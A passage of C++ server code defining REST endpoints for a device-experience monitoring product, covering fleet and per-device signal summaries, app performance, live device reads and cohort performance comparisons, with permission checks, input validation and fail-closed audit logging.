        const std::string window = req.has_param("window") ? req.get_param_value("window") : "7d";
        const std::string since = dex_iso_since(dex_window_to_days(window));
        auto rows = guaranteed_state_store->dex_signal_summary(since);
        JArr arr;
        for (const auto& r : rows) {
            arr.add(JObj()
                        .add("obs_type", r.obs_type)
                        .add("count", r.count)
                        .add("distinct_devices", r.distinct_devices)
                        .add("last_seen", r.last_seen));
        }
        res.set_content(list_json(arr.str(), static_cast<int64_t>(rows.size()), 0),
                        "application/json");
    });

    // GET /dex/devices/{id} — per-device DEX read model: the experience score +
    // this device's signal summary (obs_type → count). The machine-readable
    // equivalent of the dashboard device DEX lens (agentic-first A1/A2). Per-device
    // SCOPED (require_scoped_permission when wired; else the global perm_fn gate,
    // parity with the rest of the per-device /api/v1 surface) + audit-on-open, the
    // same posture as /fragments/device/dex.
    sink.Get(
        R"(/api/v1/dex/devices/([^/]+))",
        [scoped_perm_fn, guaranteed_state_store, audit_fn](const httplib::Request& req,
                                                           httplib::Response& res) {
            const std::string agent_id = req.matches[1].str();
            const auto cid = detail::make_correlation_id();
            // Echo the correlation id on EVERY response path (success + error), the
            // same posture as /api/v1/events — agentic callers correlate the header
            // with the body's correlation_id (A3).
            res.set_header("X-Correlation-Id", cid);
            // Per-device scope is mandatory — fail CLOSED if the gate is unwired
            // rather than silently widening to a global Read (production always wires
            // it from server.cpp; sibling DeviceRoutes likewise refuses without it).
            if (!scoped_perm_fn) {
                res.status = 500;
                res.set_content(detail::error_json_a4(500, "scope gate not configured", cid),
                                "application/json");
                return;
            }
            if (!scoped_perm_fn(req, res, "GuaranteedState", "Read", agent_id))
                return; // the gate wrote its own 401/403
            if (!guaranteed_state_store) {
                res.status = 503;
                res.set_content(detail::error_json_a4(503, "service unavailable", cid),
                                "application/json");
                return;
            }
            // Validate the window enum BEFORE auditing/reading — an off-enum value is
            // a 400, not a silently-defaulted 7d whose echoed `window` would then
            // contradict the data (parity with /dex/signals/{obs_type}'s validation).
            const std::string window =
                req.has_param("window") ? req.get_param_value("window") : "7d";
            if (window != "24h" && window != "7d" && window != "30d" && window != "all") {
                res.status = 400;
                res.set_content(
                    detail::error_json_a4(400, "invalid window (expected 24h|7d|30d|all)", cid),
                    "application/json");
                return;
            }
            // Audit-on-open is FAIL-CLOSED for this PII read: capture the AuditFn
            // bool and refuse to serve the device's behavioral data when the evidence
            // row is KNOWN to have failed to persist (audit DB locked/full/corrupt).
            // Serving audited PII while the audit row is known-lost is exactly the
            // failure audit-on-open exists to prevent (SOC 2 CC7.2 / works-council).
            // A null audit_fn means no audit callback wired (test / audit-off config),
            // not a persistence failure — that path serves, per the AuditFn contract.
            // Shared #1647 helper sets Sec-Audit-Failed + logs a bad_alloc-class throw.
            if (!detail::emit_behavioral_audit(audit_fn, req, res, "dex.device.view", "success",
                                               "Agent", agent_id,
                                               "REST per-device DEX read model cid=" + cid)) {
                res.status = 503;
                res.set_content(
                    detail::error_json_a4(503, "audit subsystem unavailable; refusing to serve "
                                               "device data without durable evidence",
                                          cid, 5000, "retry the request"),
                    "application/json");
                spdlog::warn("dex.device.view audit fail-closed (503) cid={} agent_id={}", cid,
                             agent_id);
                return;
            }
            const std::string since = dex_iso_since(dex_window_to_days(window));
            const int score = dex_device_score(guaranteed_state_store, agent_id, since);
            JArr signals;
            for (const auto& s : guaranteed_state_store->dex_device_signal_summary(agent_id, since))
                signals.add(JObj()
                                .add("obs_type", s.obs_type)
                                .add("count", s.count)
                                .add("distinct_devices", s.distinct_devices)
                                .add("last_seen", s.last_seen));
            auto data = JObj()
                            .add("agent_id", agent_id)
                            .add("window", window)
                            .add("score", score)
                            .raw("signals", signals.str())
                            .str();
            res.set_content(ok_json(data), "application/json");
        });

    // GET /dex/devices/{id}/app-perf?app=<name> — the per-device B1 drill: this
    // device's retained daily app-version perf series (the "over time, on THIS
    // box" companion to the fleet trend /dex/perf/app). Per-device behavioural PII,
    // so it lives on the audited per-device family (NOT /dex/perf/*): SCOPED
    // Read + audit-on-open FAIL-CLOSED, the same posture as the read model above
    // (dex.device.view). Optional ?app= narrows to one app. No percentiles — a
    // single device's daily averages ARE the series; percentiles are a fleet/group
    // concept.
    sink.Get(
        R"(/api/v1/dex/devices/([^/]+)/app-perf)",
        [scoped_perm_fn, audit_fn, app_perf_providers](const httplib::Request& req,
                                                       httplib::Response& res) {
            const std::string agent_id = req.matches[1].str();
            const auto cid = detail::make_correlation_id();
            res.set_header("X-Correlation-Id", cid);
            if (!scoped_perm_fn) { // fail CLOSED if the scope gate is unwired
                res.status = 500;
                res.set_content(detail::error_json_a4(500, "scope gate not configured", cid),
                                "application/json");
                return;
            }
            if (!scoped_perm_fn(req, res, "GuaranteedState", "Read", agent_id))
                return; // the gate wrote its own 401/403
            if (!app_perf_providers.device) {
                res.status = 503;
                res.set_content(detail::error_json_a4(
                                    503, "service unavailable", cid, /*retry_after_ms=*/5000,
                                    "retry after server warmup; the app-perf store provider "
                                    "initialises during startup"),
                                "application/json");
                return;
            }
            // Audit-on-open, FAIL-CLOSED (per-device PII) — refuse to serve when the
            // evidence row is known-lost (#1647 shared helper; dex.device.view posture).
            if (!detail::emit_behavioral_audit(audit_fn, req, res, "dex.device.app_perf.view",
                                               "success", "Agent", agent_id,
                                               "REST per-device app-perf drill cid=" + cid)) {
                res.status = 503;
                res.set_content(
                    detail::error_json_a4(503, "audit subsystem unavailable; refusing to serve "
                                               "device data without durable evidence",
                                          cid, 5000, "retry the request"),
                    "application/json");
                spdlog::warn("dex.device.app_perf.view audit fail-closed (503) cid={} agent_id={}",
                             cid, agent_id);
                return;
            }
            auto rows = app_perf_providers.device(agent_id);
            if (!rows) { // AUTHORITATIVE read degrade
                res.status = 503;
                res.set_content(
                    detail::error_json_a4(503, "app-perf store read degraded", cid,
                                          /*retry_after_ms=*/2000,
                                          "the app-perf store could not be read; retry shortly"),
                    "application/json");
                return;
            }
            const std::string app_filter = req.has_param("app") ? req.get_param_value("app") : "";
            JArr arr;
            for (const auto& r : *rows) {
                if (!app_filter.empty() && r.app_name != app_filter)
                    continue;
                arr.add(JObj()
                            .add("app_name", r.app_name)
                            .add("version", r.version)
                            .add("day", r.day)
                            .add("samples", r.samples)
                            .add("instances_max", r.instances_max)
                            .add("cpu_avg", r.cpu_avg)
                            .add("cpu_max", r.cpu_max)
                            .add("ws_avg_bytes", r.ws_avg_bytes)
                            .add("ws_max_bytes", r.ws_max_bytes));
            }
            res.set_content(
                ok_json(JObj().add("agent_id", agent_id).add("app", app_filter).raw("rows",
                                                                                    arr.str()).str()),
                "application/json");
        });

    if (metrics_registry) {
        metrics_registry->describe(
            "yuzu_server_live_requests_total",
            "Per-device live-read (/api/v1/dex/devices/{id}/live) requests by kind and terminal "
            "HTTP status",
            "counter");
        metrics_registry->describe(
            "yuzu_server_live_inflight",
            "Current in-flight synchronous live-read polls (bounded by the concurrency cap)",
            "gauge");
    }
    // POST /dex/devices/{id}/live?kind=uptime|processes — live device read. Dispatches
    // a real read-only plugin instruction NOW and returns the result as JSON. The
    // machine-readable equivalent of the dashboard "Get live info" panel, which has
    // NO other REST path (raw plugin actions are not dispatchable via /api/v1, and no
    // InstructionDefinition wraps processes/list_hashed). Scoped Read + Execute.
    // SYNCHRONOUS bounded poll: this handler blocks up to ~20s waiting for the agent;
    // a slow/offline device returns 504/503 with retry_after_ms. POINTER-FREE poll —
    // each iteration copies the fields it needs out of the freshly queried vector, so
    // no pointer outlives the loop (the device-routes UAF class, avoided by design).
    // POST (not GET): /live DISPATCHES a real command to the device — a side effect.
    // GET must stay safe/idempotent (prefetchers/proxies/retry libraries fire GETs
    // speculatively), and every other command-dispatch route on /api/v1 is POST
    // (architect B1). The read model above stays GET.
    sink.Post(
        R"(/api/v1/dex/devices/([^/]+)/live)",
        [scoped_perm_fn, response_store, command_dispatch_fn, audit_fn, metrics_registry](
            const httplib::Request& req, httplib::Response& res) {
            const std::string agent_id = req.matches[1].str();
            const auto cid = detail::make_correlation_id();
            // Echo the correlation id on EVERY response path (A3), parity with the
            // read model above and /api/v1/events.
            res.set_header("X-Correlation-Id", cid);
            const std::string kind = req.has_param("kind") ? req.get_param_value("kind") : "";
            // Count every live-read by kind + terminal HTTP status at handler exit
            // (RAII, so all return paths — 200/400/403/429/500/502/503/504 — are
            // covered without littering each branch). sre S1.
            struct OutcomeRecorder {
                yuzu::MetricsRegistry* reg;
                const std::string& kind;
                const httplib::Response& res;
                ~OutcomeRecorder() {
                    if (reg)
                        reg->counter("yuzu_server_live_requests_total",
                                     {{"kind", kind.empty() ? "unknown" : kind},
                                      {"outcome", std::to_string(res.status)}})
                            .increment();
                }
            } outcome{metrics_registry, kind, res};
            std::string plugin, action, audit_action;
            if (const auto lk = live::resolve_kind(kind)) {
                plugin = lk->plugin;
                action = lk->action;
                audit_action = lk->audit_action;
            }
            // Per-device scope is mandatory — fail CLOSED if unwired (never widen to
            // the global gate). Scoped Read floor + Execute, before validate/dispatch.
            if (!scoped_perm_fn) {
                res.status = 500;
                res.set_content(detail::error_json_a4(500, "scope gate not configured", cid),
                                "application/json");
                return;
            }
            const auto gate = [&](const char* sec, const char* op) {
                return scoped_perm_fn(req, res, sec, op, agent_id);
            };
            if (!gate("GuaranteedState", "Read"))
                return;
            if (!gate("Execution", "Execute"))
                return;
            if (plugin.empty()) {
                res.status = 400;
                res.set_content(
                    detail::error_json_a4(400, "unknown kind (expected uptime|processes)", cid),
                    "application/json");
                return;
            }
            if (!command_dispatch_fn || !response_store) {
                res.status = 503;
                res.set_content(
                    detail::error_json_a4(503, "live device query unavailable", cid, 5000, ""),
                    "application/json");
                return;
            }
            // Concurrency cap (UP-1/2/3): acquire an in-flight slot BEFORE dispatch so
            // an over-budget caller gets 429 without orphaning a command. RAII releases
            // the slot on every return below; the gauge mirrors current depth.
            yuzu::Gauge* inflight_gauge =
                metrics_registry ? &metrics_registry->gauge("yuzu_server_live_inflight") : nullptr;
            LiveInflightGuard slot{inflight_gauge};
            if (!slot.acquired()) {
                res.status = 429;
                res.set_content(detail::error_json_a4(
                                    429, "too many concurrent live queries; retry shortly", cid,
                                    2000, "retry the request"),
                                "application/json");
                return;
            }
            // Audit the REQUEST BEFORE the side-effect (audit-on-open / UP-8): the
            // works-council-relevant event is "the operator requested live data on this
            // device" — known here, before dispatch. FAIL-CLOSED: when the evidence row
            // is KNOWN to have failed to persist, do NOT dispatch the (usage-class)
            // probe. Dispatching while the audit row is known-lost is exactly what
            // audit-on-open prevents (SOC 2 CC7.2). result="requested" (not the old
            // post-dispatch "dispatched"/"no_agents"): whether an agent was reached is
            // reported by the response itself (503 below when none) — command_id is
            // minted by dispatch, so it surfaces in metrics / the response store, not
            // the pre-dispatch audit. A null audit_fn is test / audit-off, not a
            // persistence failure, and dispatches per the AuditFn contract.
            // Usage-class read (processes) stays separately auditable from machine-
            // health (uptime) via the per-kind audit_action.
            if (audit_fn && !audit_fn(req, audit_action, "requested", "Agent", agent_id,
                                      "REST live " + plugin + "/" + action + " cid=" + cid)) {
                res.status = 503;
                res.set_header("Sec-Audit-Failed", "true");
                res.set_content(
                    detail::error_json_a4(503, "audit subsystem unavailable; refusing to dispatch "
                                               "without durable evidence",
                                          cid, 5000, "retry the request"),
                    "application/json");
                spdlog::warn("{} audit fail-closed (503, no dispatch) cid={} agent_id={}",
                             audit_action, cid, agent_id);
                return;
            }
            const auto [command_id, sent] =
                command_dispatch_fn(plugin, action, {agent_id}, "", {}, /*execution_id=*/"");
            if (sent == 0) {
                res.status = 503;
                res.set_content(detail::error_json_a4(
                                    503, "device offline — live info needs a connected agent", cid,
                                    5000, ""),
                                "application/json");
                return;
            }
            // Bounded synchronous poll (~20s default; processes/list_hashed hashes each
            // on-disk image, so allow generous time before a 504). Budget is a test
            // seam (defaults in detail::live_poll_*).
            const int max_polls = detail::live_poll_max_polls().load(std::memory_order_relaxed);
            const auto interval =
                std::chrono::milliseconds(detail::live_poll_interval_ms().load(std::memory_order_relaxed));
            // Cap the device output we parse/return (UP-11) — a runaway/malicious agent
            // must not make us hold + line-split a multi-MB blob in the worker.
            constexpr std::size_t kMaxLiveOutputBytes = 4 * 1024 * 1024;
            for (int i = 0; i < max_polls; ++i) {
                if (i > 0)
                    std::this_thread::sleep_for(interval); // query first; back off only on miss
                std::string output, error_detail;
                int terminal = -1;
                bool have_output = false;
                for (const auto& r : response_store->query(command_id)) {
                    if (r.agent_id != agent_id)
                        continue; // never render another agent's row
                    if (!r.output.empty()) {
                        output = r.output;
                        have_output = true;
                    }
                    if (r.status >= 1) {
                        terminal = r.status;
                        error_detail = r.error_detail;
                    }
                }
                // FAILURE WINS (UP-4): a terminal-failure row must 502 even if a
                // partial-output row is also present — otherwise a failed command with
                // partial output returns a false 200.
                if (terminal >= 2) {
                    res.status = 502;
                    res.set_content(
                        detail::error_json_a4(502, "device query failed: " + error_detail.substr(0, 200),
                                              cid),
                        "application/json");
                    return;
                }
                if (have_output) {
                    if (output.rfind("error|", 0) == 0) {
                        res.status = 502;
                        res.set_content(detail::error_json_a4(
                                            502, "device reported an error: " + output.substr(6, 200),
                                            cid),
                                        "application/json");
                        return;
                    }
                    if (output.size() > kMaxLiveOutputBytes) {
                        res.status = 502;
                        res.set_content(
                            detail::error_json_a4(502, "device output too large", cid),
                            "application/json");
                        return;
                    }
                    res.set_content(ok_json(live_result_json(kind, output)), "application/json");
                    return;
                }
                if (terminal == 1) {
                    // success terminal, no output → empty result (not a false timeout)
                    res.set_content(ok_json(live_result_json(kind, "")), "application/json");
                    return;
                }
            }
            res.status = 504;
            res.set_content(
                detail::error_json_a4(504, "device did not respond in time", cid, 3000,
                                      "retry the request"),
                "application/json");
        });

    // GET /dex/scope — per-OS signal coverage (how many distinct obs_types each
    // platform reports, and total events). Aggregate; not audited.
    sink.Get("/api/v1/dex/scope", [perm_fn, guaranteed_state_store](const httplib::Request& req,
                                                                    httplib::Response& res) {
        if (!perm_fn(req, res, "GuaranteedState", "Read"))
            return;
        if (!guaranteed_state_store) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }
        const std::string window = req.has_param("window") ? req.get_param_value("window") : "7d";
        const std::string since = dex_iso_since(dex_window_to_days(window));
        auto rows = guaranteed_state_store->dex_os_signal_scope(since);
        JArr arr;
        for (const auto& r : rows) {
            arr.add(JObj()
                        .add("platform", r.platform)
                        .add("distinct_types", r.distinct_types)
                        .add("total_events", r.total_events));
        }
        res.set_content(list_json(arr.str(), static_cast<int64_t>(rows.size()), 0),
                        "application/json");
    });

    // GET /dex/signals/{obs_type} — one signal type's drill-down: top subjects,
    // per-OS split, most-affected devices, and the per-day trend. The devices[]
    // array names agent_ids exhibiting this signal (behavioral, individual-
    // identifying) so this endpoint emits dex.signal.view — parity with the
    // /fragments/dex/catalogue/signal route (governance B4) and the agent_id-
    // filtered /guaranteed-state/events audit. obs_type is validated here (not by
    // the route regex) so malformed input yields a clear 400 rather than a silent
    // 404 route-miss; a valid-but-absent type yields 200 with empty arrays (the
    // read-model has no such observations — it is not an entity-not-found).
    sink.Get(R"(/api/v1/dex/signals/([^/]+))",
             [perm_fn, audit_fn, guaranteed_state_store](const httplib::Request& req,
                                                         httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 if (!guaranteed_state_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }
                 const std::string obs_type = req.matches[1].str();
                 // obs_type is the catalogue's machine key: lowercase dotted
                 // segments (process.crashed, os.boot, app.sxs_error, ...). Accept
                 // [A-Za-z0-9._-] up to 64 chars; reject anything else as 400.
                 const bool ok =
                     !obs_type.empty() && obs_type.size() <= 64 &&
                     obs_type.find_first_not_of("ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                                "abcdefghijklmnopqrstuvwxyz0123456789._-") ==
                         std::string::npos;
                 if (!ok) {
                     res.status = 400;
                     res.set_content(error_json("invalid obs_type"), "application/json");
                     return;
                 }
                 const std::string window =
                     req.has_param("window") ? req.get_param_value("window") : "7d";
                 const std::string since = dex_iso_since(dex_window_to_days(window));
                 int limit = 50;
                 if (req.has_param("limit")) {
                     int v = 0;
                     auto s = req.get_param_value("limit");
                     [[maybe_unused]] auto [_, ec] =
                         std::from_chars(s.data(), s.data() + s.size(), v);
                     if (ec != std::errc{} || v < 0) {
                         res.status = 400;
                         res.set_content(error_json("invalid limit"), "application/json");
                         return;
                     }
                     limit = std::min(v, 500);
                 }
                 // Behavioral-PII access audit: the devices[] list below names the
                 // agent_ids exhibiting this signal. Emit the same verb the
                 // dashboard per-signal view does so a SIEM filter catches both.
                 // FAIL-CLOSED (governance #1549 consistency-B1): refuse to serve the
                 // device list when the evidence row is KNOWN-lost — parity with GET
                 // /dex/devices/{id}. Null audit_fn (audit-off) serves per contract.
                 // Shared #1647 helper sets Sec-Audit-Failed + logs a throwing audit_fn.
                 if (!detail::emit_behavioral_audit(
                         audit_fn, req, res, "dex.signal.view", "success", "ObsType", obs_type,
                         "DEX per-signal drill-down via REST /api/v1/dex/signals/{obs_type}")) {
                     // A4 envelope (correlation_id + retry_after_ms) for parity with the
                     // /dex/devices/{id} + baseline siblings (#1651 review K2);
                     // Sec-Audit-Failed already set by emit_behavioral_audit. Transient — retry.
                     const auto cid = detail::make_correlation_id();
                     res.status = 503;
                     res.set_header("X-Correlation-Id", cid);
                     res.set_content(
                         detail::error_json_a4(503,
                                               "audit subsystem unavailable; refusing to serve "
                                               "device data without durable evidence",
                                               cid, 5000, "retry after the audit subsystem recovers"),
                         "application/json");
                     spdlog::warn("dex.signal.view audit fail-closed (503) obs_type={} cid={}",
                                  obs_type, cid);
                     return;
                 }

                 JArr subjects;
                 for (const auto& s : guaranteed_state_store->dex_signal_subjects(obs_type, since,
                                                                                  limit)) {
                     subjects.add(JObj()
                                      .add("subject", s.subject)
                                      .add("count", s.count)
                                      .add("distinct_devices", s.distinct_devices)
                                      .add("last_seen", s.last_seen));
                 }
                 JArr by_os;
                 for (const auto& o : guaranteed_state_store->dex_signal_by_os(obs_type, since)) {
                     // DexOsCrashCount.crashes carries the generic event count for
                     // the generalised per-obs_type read (see the store header).
                     by_os.add(JObj()
                                   .add("platform", o.platform)
                                   .add("count", o.crashes)
                                   .add("distinct_devices", o.distinct_devices));
                 }
                 JArr devices;
                 for (const auto& d : guaranteed_state_store->dex_signal_devices(obs_type, since,
                                                                                 limit)) {
                     devices.add(JObj()
                                     .add("agent_id", d.agent_id)
                                     .add("count", d.crashes)
                                     .add("last_seen", d.last_seen));
                 }
                 JArr by_day;
                 for (const auto& d : guaranteed_state_store->dex_signal_by_day(obs_type, since)) {
                     by_day.add(JObj().add("day", d.day).add("count", d.crashes));
                 }
                 res.set_content(ok_json(JObj()
                                             .add("obs_type", obs_type)
                                             .raw("subjects", subjects.str())
                                             .raw("by_os", by_os.str())
                                             .raw("devices", devices.str())
                                             .raw("by_day", by_day.str())
                                             .str()),
                                 "application/json");
             });

    // ── F2a: fleet performance read model (/api/v1/dex/perf/*) ──────────────
    //
    // First-class REST for the /dex Performance tab (A1 agentic-first — "is
    // the fleet's CPU healthy?" must be machine-answerable, not fragment-
    // scrape-only). Same render-time aggregation over registry heartbeat
    // state the fragments use (one DexPerfFn provider, three surfaces), same
    // GuaranteedState:Read gate as the sibling DEX endpoints. NOT audited:
    // fleet/cohort responses are aggregates, and the devices list is
    // machine-health telemetry (CPU/commit/disk latency — device state, not
    // behavioral data; the behavioral DEX surfaces keep their audit rows).
    // F2b adds /api/v1/dex/perf/trend over the retained series when the
    // Postgres-backed store lands.

    auto perf_stat_json = [](const std::optional<DexPerfStat>& s) -> std::string {
        if (!s)
            return "null"; // absent-not-zero: nobody reported this metric
        return JObj()
            .add("avg", s->avg)
            .add("p50", s->p50)
            .add("p90", s->p90)
            .add("max", s->max)
            .add("n", s->n)
            .str();
    };

    // GET /dex/perf/fleet — the now-stats per metric + the honest denominators
    // (the same numbers the yuzu_fleet_perf_* Prometheus gauges export).
    sink.Get("/api/v1/dex/perf/fleet",
             [perm_fn, dex_perf_fn, perf_stat_json](const httplib::Request& req,
                                                    httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 // A4 backfill (#1470): match the cohort-diff sibling — a correlation
                 // id on every response + the A4 error envelope on failures.
                 const auto cid = detail::make_correlation_id();
                 res.set_header("X-Correlation-Id", cid);
                 if (!dex_perf_fn) {
                     res.status = 503;
                     res.set_content(
                         detail::error_json_a4(503, "service unavailable", cid,
                                               /*retry_after_ms=*/5000,
                                               "retry after server warmup; the fleet-perf snapshot "
                                               "provider initialises during startup"),
                         "application/json");
                     return;
                 }
                 const auto now = dex_perf_fleet_now(dex_perf_fn(std::string{}));
                 res.set_content(ok_json(JObj()
                                             .raw("cpu_pct", perf_stat_json(now.cpu))
                                             .raw("commit_pct", perf_stat_json(now.commit))
                                             .raw("disk_lat_ms", perf_stat_json(now.disk_lat))
                                             .add("reporting", now.reporting)
                                             .add("windows_online", now.windows_online)
                                             .str()),
                                 "application/json");
             });

    // GET /dex/perf/cohorts?key=<tag-key> — fleet-relative percentiles per
    // cohort of the chosen tag key (CONTEXT.md "Cohort"). Sub-floor cohorts
    // carry suppressed=true with their population and no stats; the untagged
    // residual is the cohort=="" row.
    sink.Get("/api/v1/dex/perf/cohorts",
             [perm_fn, dex_perf_fn, perf_stat_json](const httplib::Request& req,
                                                    httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 // A4 backfill (#1470): correlation id + A4 error envelope (cohort-diff parity).
                 const auto cid = detail::make_correlation_id();
                 res.set_header("X-Correlation-Id", cid);
                 if (!dex_perf_fn) {
                     res.status = 503;
                     res.set_content(
                         detail::error_json_a4(503, "service unavailable", cid,
                                               /*retry_after_ms=*/5000,
                                               "retry after server warmup; the fleet-perf snapshot "
                                               "provider initialises during startup"),
                         "application/json");
                     return;
                 }
                 const std::string key =
                     req.has_param("key") ? req.get_param_value("key") : kDexDefaultCohortKey;
                 if (!TagStore::validate_key(key)) {
                     res.status = 400;
                     res.set_content(detail::error_json_a4(400, "invalid tag key", cid),
                                     "application/json");
                     return;
                 }
                 const auto snap = dex_perf_fn(key);
                 JArr rows;
                 for (const auto& c : dex_perf_cohorts(snap)) {
                     JObj o;
                     o.add("cohort", c.cohort)
                         .add("devices", c.devices)
                         .add("suppressed", c.suppressed);
                     if (!c.suppressed) {
                         o.raw("cpu_pct", perf_stat_json(c.cpu))
                             .raw("commit_pct", perf_stat_json(c.commit))
                             .raw("disk_lat_ms", perf_stat_json(c.disk_lat));
                     }
                     rows.add(std::move(o));
                 }
                 JArr keys;
                 for (const auto& k : snap.available_keys)
                     keys.add(k);
                 res.set_content(ok_json(JObj()
                                             .add("key", key)
                                             .add("floor", kDexCohortFloor)
                                             .raw("cohorts", rows.str())
                                             .raw("available_keys", keys.str())
                                             .str()),
                                 "application/json");
             });

    // GET /dex/perf/cohort-diff?key=&a=&b= — F2c (BRD 99/103): the direct
    // A-vs-B cohort comparison (e.g. image_type vanilla vs layered, or model X
    // vs Y). F2a benchmarks each cohort against the FLEET; this diffs two
    // cohorts head-to-head. delta_pct is A's p50 relative to B's p50 (B the
    // baseline), present only when BOTH cohorts expose the metric (neither
    // suppressed below the floor). Aggregate — NOT audited. (The fleet-per-app
    // half of the BRD F2c residual, row 100, is deferred: per-app data is
    // device-drill-only, not fleet render-time — see dex_perf_model.hpp.)
    sink.Get("/api/v1/dex/perf/cohort-diff",
             [perm_fn, dex_perf_fn, perf_stat_json](const httplib::Request& req,
                                                    httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 const auto cid = detail::make_correlation_id();
                 res.set_header("X-Correlation-Id", cid);
                 if (!dex_perf_fn) {
                     res.status = 503;
                     res.set_content(
                         detail::error_json_a4(503, "service unavailable", cid,
                                               /*retry_after_ms=*/5000,
                                               "retry after server warmup; the fleet-perf snapshot "
                                               "provider initialises during startup"),
                         "application/json");
                     return;
                 }
                 const std::string key =
                     req.has_param("key") ? req.get_param_value("key") : kDexDefaultCohortKey;
                 if (!TagStore::validate_key(key)) {
                     res.status = 400;
                     res.set_content(detail::error_json_a4(400, "invalid tag key", cid,
                                                           "key must match [A-Za-z0-9_.:-]{1,64}"),
                                     "application/json");
                     return;
                 }
                 // Both cohort values are required. A value of "" is the
                 // legitimate untagged residual, so "missing" must be tested by
                 // has_param, not by emptiness.
                 if (!req.has_param("a") || !req.has_param("b")) {
                     res.status = 400;
                     res.set_content(
                         detail::error_json_a4(400, "cohort params 'a' and 'b' are required", cid,
                                               "supply both a= and b= cohort values (an empty "
                                               "value selects the untagged residual)"),
                         "application/json");
                     return;
                 }
                 const auto a = req.get_param_value("a");
                 const auto b = req.get_param_value("b");
                 // Validate the cohort VALUES too (only `key` was checked before):
                 // the 448-byte tag-value cap. Empty stays valid (untagged residual).
                 if (!TagStore::validate_value(a) || !TagStore::validate_value(b)) {
                     res.status = 400;
                     res.set_content(detail::error_json_a4(400, "cohort value too long", cid,
                                                           "cohort values must be <= 448 bytes"),
                                     "application/json");
                     return;
                 }
                 const auto d = dex_perf_cohort_diff(dex_perf_fn(key), a, b);
                 auto cohort_obj = [&](bool found, const DexPerfCohortRow& c) -> std::string {
                     if (!found)
                         return "null";
                     JObj o;
                     o.add("cohort", c.cohort).add("devices", c.devices).add("suppressed",
                                                                             c.suppressed);
                     if (!c.suppressed)
                         o.raw("cpu_pct", perf_stat_json(c.cpu))
                             .raw("commit_pct", perf_stat_json(c.commit))
                             .raw("disk_lat_ms", perf_stat_json(c.disk_lat));
                     return o.str();
                 };
                 // delta_pct.<metric> is a number when present, JSON null when
                 // absent — built via JObj so the double formatting matches the
                 // stats above (and avoids a std::format dependency here).
                 auto delta_obj = [&] {
                     JObj o;
                     if (d.cpu_delta_pct)
                         o.add("cpu_pct", *d.cpu_delta_pct);
                     else
                         o.raw("cpu_pct", "null");
                     if (d.commit_delta_pct)
                         o.add("commit_pct", *d.commit_delta_pct);
                     else
                         o.raw("commit_pct", "null");
                     if (d.disk_lat_delta_pct)
                         o.add("disk_lat_ms", *d.disk_lat_delta_pct);
                     else
                         o.raw("disk_lat_ms", "null");
                     return o.str();
                 };
                 res.set_content(ok_json(JObj()
                                             .add("key", key)
                                             .add("floor", kDexCohortFloor)
                                             .add("found_a", d.found_a)
                                             .add("found_b", d.found_b)
                                             .raw("a", cohort_obj(d.found_a, d.a))
                                             .raw("b", cohort_obj(d.found_b, d.b))
                                             .raw("delta_pct", delta_obj())
                                             .str()),
                                 "application/json");
             });

    // GET /dex/perf/devices?metric=&filter=&cohort_key=&cohort_value=&limit= —
    // the ONE device list behind every Performance drill: worst-by-metric
    // (default), the not-reporting complement (filter=not_reporting), or a
    // cohort's members (cohort_key + cohort_value; empty value = untagged).
    sink.Get("/api/v1/dex/perf/devices",
             [perm_fn, dex_perf_fn](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 // A4 backfill (#1470): correlation id + A4 error envelope (cohort-diff parity).
                 const auto cid = detail::make_correlation_id();
                 res.set_header("X-Correlation-Id", cid);
                 if (!dex_perf_fn) {
                     res.status = 503;
                     res.set_content(
                         detail::error_json_a4(503, "service unavailable", cid,
                                               /*retry_after_ms=*/5000,
                                               "retry after server warmup; the fleet-perf snapshot "
                                               "provider initialises during startup"),
                         "application/json");
                     return;
                 }
                 const DexPerfMetric metric = dex_perf_metric_from_token(
                     req.has_param("metric") ? req.get_param_value("metric") : "cpu");
                 const bool not_reporting = req.has_param("filter") &&
                                            req.get_param_value("filter") == "not_reporting";
                 // Grill fix (parity with the fragment): the cohort KEY always
                 // resolves (default "model") so rows carry real cohort values;
                 // FILTERING applies only when cohort_value is present ("" =
                 // the untagged residual).
                 std::string cohort_key =
                     req.has_param("cohort_key") ? req.get_param_value("cohort_key")
                                                 : kDexDefaultCohortKey;
                 if (!TagStore::validate_key(cohort_key)) {
                     res.status = 400;
                     res.set_content(detail::error_json_a4(400, "invalid cohort_key", cid),
                                     "application/json");
                     return;
                 }
                 std::optional<std::string> cohort_filter;
                 if (req.has_param("cohort_value"))
                     cohort_filter = req.get_param_value("cohort_value");
                 int limit = 50;
                 if (req.has_param("limit")) {
                     int v = 0;
                     auto s = req.get_param_value("limit");
                     [[maybe_unused]] auto [_, ec] =
                         std::from_chars(s.data(), s.data() + s.size(), v);
                     if (ec != std::errc{} || v <= 0) {
                         res.status = 400;
                         res.set_content(detail::error_json_a4(400, "invalid limit", cid),
                                         "application/json");
                         return;
                     }
                     limit = std::min(v, 500);
                 }
                 const auto rows = dex_perf_device_list(dex_perf_fn(cohort_key), metric,
                                                        not_reporting, cohort_filter, limit);
                 JArr arr;
                 for (const auto& r : rows) {
                     JObj o;
                     o.add("agent_id", r.agent_id).add("cohort", r.cohort);
                     if (r.cpu_pct)
                         o.add("cpu_pct", *r.cpu_pct);
                     if (r.commit_pct)
                         o.add("commit_pct", *r.commit_pct);
                     if (r.disk_lat_ms)
                         o.add("disk_lat_ms", *r.disk_lat_ms);
                     if (r.fleet_pctile >= 0)
                         o.add("fleet_pctile", static_cast<int64_t>(r.fleet_pctile));
                     arr.add(std::move(o));
                 }
                 res.set_content(list_json(arr.str(), static_cast<int64_t>(rows.size()), 0),
                                 "application/json");
             });

    // ── DEX app-perf-over-time read surface (slice 2; Postgres B1/B2) ─────────
    //
    // The "performance over time" companion to the heartbeat-NOW /dex/perf/*
    // family above: those answer "is the fleet healthy right now" off live
    // heartbeat state; these read the RETAINED B1 (per-device daily) / B2 (fleet
    // aggregate) substrate to answer "did app X regress across the fleet over the
